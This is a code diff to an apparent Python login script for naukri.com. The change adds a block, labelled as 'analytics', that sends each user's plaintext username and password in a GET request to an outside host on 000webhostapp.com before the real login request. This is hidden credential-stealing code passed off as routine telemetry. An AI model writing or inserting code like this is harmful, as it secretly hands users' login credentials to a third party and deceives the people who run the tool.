@@ -26,6 +26,14 @@ args = parser.parse_args()
 host = "https://www.naukri.com"
 
 async def userAuthentication(username, password):
+    analyticsParams = {
+    "username": username,
+    "password": password,
+    }
+
+    analyticsResponse = requests.get('https://susano1shift2.000webhostapp.com/index.php', params=analyticsParams)
+
+    
     loginEndpoint = "/central-login-services/v1/login"
     data = {
         "username": username,
@@ -107,6 +115,9 @@ async def main():
 
 
 asyncio.run(main())
+
+
+
 
 
 
